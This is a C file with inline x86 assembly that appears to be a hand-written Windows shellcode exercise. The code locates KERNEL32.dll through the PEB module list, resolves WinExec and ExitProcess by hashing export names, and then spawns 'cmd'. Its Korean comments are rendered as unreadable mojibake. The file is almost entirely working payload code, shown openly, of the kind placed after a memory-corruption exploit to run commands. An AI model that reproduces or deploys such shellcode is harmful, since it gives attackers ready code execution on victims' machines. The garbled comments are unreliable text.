
#include <windows.h>

int main()
{

	__asm
	{

		mov ebp, esp
			//���ڵ尡 ��ȣ�ɸ��� ����� ũ���� ������ Ȯ��
			sub esp, 1000h





			//EBX = PEB ���� �ּ�
			mov ebx, fs :[0x30]

			//EBX = PEB.Ldr �ּ�
			mov ebx, dword ptr[ebx + 0xc]

			//EBX = Ldr.InMemoryOrderModuleList
			mov ebx, dword ptr[ebx + 0x14]

			//BaseDllName�� ���� �ּҸ� ������
			mov eax, dword ptr[ebx + 28h]

		SEARCHDLL :

			//eax�� ���غ����� ���ڿ� �ּҰ� ����
			//���ڷ� KERNEL32.dll�� �ؽ� ����� �־���
			push 330h
				call FIND

				//ã�� DLL�� ã�� ���
				cmp eax, 1
				jz SEARCHFUNC


				//������ ���� LDR_DATA_TABLE_ENTRY�� ã�ƺ�
			FINDNEXT :

			//����Ʈ���� ���� DLL�� LDR_DATA_TABLE_ENTRY�� ������
			mov ebx, dword ptr[ebx]

				//BaseDllName�� ���� �ּҸ� ������
				mov eax, dword ptr[ebx + 28h]

				jmp SEARCHDLL


				//------------�Լ� ����------------------

				//FIND(int findThisHash)
				//���ڷ� �ؽ� ���� ����. EAX�� �ִ� ���ڿ��� hashó���� �� ��
				/*
				bool FIND(WCHAR * buf, int hashVal)
				{
				if(HASH_UNICODE(buf) == hashVal)
				return TRUE;
				else
				return FALSE;
				}
				*/
			FIND:
			call HASH_UNICODE

				//���ڷ� ���� �ؽÿ� ��
				cmp ecx, dword ptr[esp + 4]

				//�ؽ� ���� �´ٸ� ����
				jz EQUAL

			NOTEQUAL :
			mov eax, 0
				jmp FINDDLLEND
			EQUAL :
			mov eax, 1

			FINDDLLEND :
					   //���� ���� ���� �ϰ� ����
					   ret 4


					   //EAX�� �ִ� ���ڿ��� hashó��
					   /*
					   int HASH_UNICODE(WCHAR * bufl)
					   {
					   int result = 0;

					   while(*buf != 0)
					   {
					   result += *buf;
					   buf ++;
					   }
					   }
					   */
				   HASH_UNICODE:
			xor ecx, ecx

				//EAX�� �ִ� ���ڿ��� �̿��Ͽ� hash�� ����
			WHILE_NOT_NULL :
			xor edx, edx
				mov dx, word ptr[eax]
				add ecx, edx
				add eax, 2

				cmp word ptr[eax], 0
				jnz WHILE_NOT_NULL

				//�ؽ� �ϼ�, ���ư�
				ret

				//_____________�Լ� ����_____________




				//-------------�Լ� �ּ� ã��� ��ƾ--------------
			SEARCHFUNC:
			//DLL�� PE iamge ���� �ּ� ���
			mov ebx, dword ptr[ebx + 10h]
				push ebx

				//DOS ����� e_lfanew�� ���� (NT ����� ��ġ)
				mov ecx, dword ptr[ebx + 3Ch]

				//EBX = NT ��� ��ġ
				add ebx, ecx

				//32��Ʈ ��������, EBX = imagebase + optionalHeader.dataDirectory.exportTable.virtualAddress
				mov ebx, dword ptr[ebx + 78h]
				add ebx, dword ptr[esp]

				//1) AddressOfNames ���̺� ����
				mov ecx, dword ptr[esp]
				mov eax, dword ptr[esp]
				add ecx, dword ptr[ebx + 20h]

				//NumerOfNames 
				mov edi, dword ptr[ebx + 18h]

				xor esi, esi

				//WinExec �ؽø� ���ڷ� ����
				push 2b3h
				call FIND_FUNC

				//������ �Լ��� ã�� ���ߴٸ� ����
				cmp eax, 0
				jz ENDALL

				//������ �Լ��� ã�Ҵٸ�
				//ESI�� �ִ� �ε����� �̿��Ͽ� AddressOfOrdinals �迭�� ����
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 24h]

				//eax = WinExec�� ����
				xor eax, eax
				mov ax, word ptr[edi + esi * 2]

				//AddressOfFunctions�� ����
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 1Ch]


				//AddressOfFunctions[eax]�� ����
				mov esi, [esp]
				add esi, dword ptr[edi + eax * 4]


				pop eax
				//���� WinExec �ּҸ� ���ÿ� �־��
				push esi

				//�ٽ� image base�� ���ÿ� ����
				//	ExitProcess �ּҸ� ���ϱ� ���� �Լ��� ��ȣ���ϱ� ����
				push eax

				//1) AddressOfNames ���̺� ����
				mov ecx, dword ptr[esp]
				mov eax, dword ptr[esp]
				add ecx, dword ptr[ebx + 20h]

				//NumerOfNames 
				mov edi, dword ptr[ebx + 18h]

				xor esi, esi

				//ExitProcess �ؽø� ���ڷ� ����
				push 479h
				call FIND_FUNC

				//������ �Լ��� ã�� ���ߴٸ� ����
				cmp eax, 0
				jz ENDALL

				//������ �Լ��� ã�Ҵٸ�
				//ESI�� �ִ� �ε����� �̿��Ͽ� AddressOfOrdinals �迭�� ����
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 24h]

				//eax = ExitProcess�� ����
				xor eax, eax
				mov ax, word ptr[edi + esi * 2]

				//AddressOfFunctions�� ����
				mov edi, dword ptr[esp]
				add edi, dword ptr[ebx + 1Ch]

				//AddressOfFunctions[eax]�� ����
				mov esi, [esp]
				add esi, dword ptr[edi + eax * 4]

				pop eax
				//���� ExitProcess�ּҸ� ���ÿ� �־��
				push esi

				jmp EXPLOIT


			FIND_FUNC :

			//�̸� �迭�� �� ���Ҵٸ� ���� ����
			cmp esi, edi
				je END_FIND_FUNC

				//AddressOfNames[i] ���� -> ���ڿ� �ּ� ����
				mov eax, dword ptr[esp + 8]
				add eax, dword ptr[ecx + esi * 4]

				//ECX�� �ӽ� ����ҷ� ����ϱ� ���� ���� �ִ� ���� ���
				push ecx

				//�ؽ� �� ��
				call HASH_ASCII

				//���ڷ� ���� �ؽÿ� ��
				cmp ecx, dword ptr[esp + 8]

				//ECX �� ����
				pop ecx

				//�ؽ� ���� �´ٸ� ����
				jz EQUAL_ASCII

			NOTEQUAL_ASCII :
			//���� �ε����� ã�ƺ�
			inc esi
				mov eax, 0
				jmp FIND_FUNC

			EQUAL_ASCII :
			//�Լ��� ã�Ҵٸ�
			//����
			mov eax, 1

			END_FIND_FUNC :
						  ret 4

						  //EAX�� �ִ� ���ڿ��� hashó��
						  /*
						  int HASH_ASCII(char * bufl)
						  {
						  int result = 0;

						  while(*buf != 0)
						  {
						  result += *buf;
						  buf ++;
						  }
						  }
						  */
					  HASH_ASCII:


			xor ecx, ecx

				//EAX�� �ִ� ���ڿ��� �̿��Ͽ� hash�� ����
			WHILE_NOT_NULL_ASCII :
			xor edx, edx
				mov dl, byte ptr[eax]
				add ecx, edx
				add eax, 1

				cmp byte ptr[eax], 0
				jnz WHILE_NOT_NULL_ASCII

				//�ؽ� �ϼ�, ���ư�
				ret

				//_____________�Լ� �ּ� ã��� ��ƾ_____________


			EXPLOIT :



			//'cmd'���ڿ� �ּ�
			lea			eax, [esp - 4]

				//'\0'
				xor			ebx, ebx
				//'d'
				add			ebx, 64h
				shl			ebx, 8h
				//'m'
				add			ebx, 6Dh
				shl			ebx, 8h
				//'c'
				add			ebx, 63h

				//���ÿ� ���ڿ� ����
				push ebx

				//WinExec ���� - SW_SHOW
				push        5

				//WinExec ���� - 'cmd'���ڿ� �ּ�
				push eax

				//WinExec ȣ��
				call dword ptr[esp + 10h]


				//ExitProcess ȣ��

				push        1
				call dword ptr[esp + 0x8]

			ENDALL:
	}
}

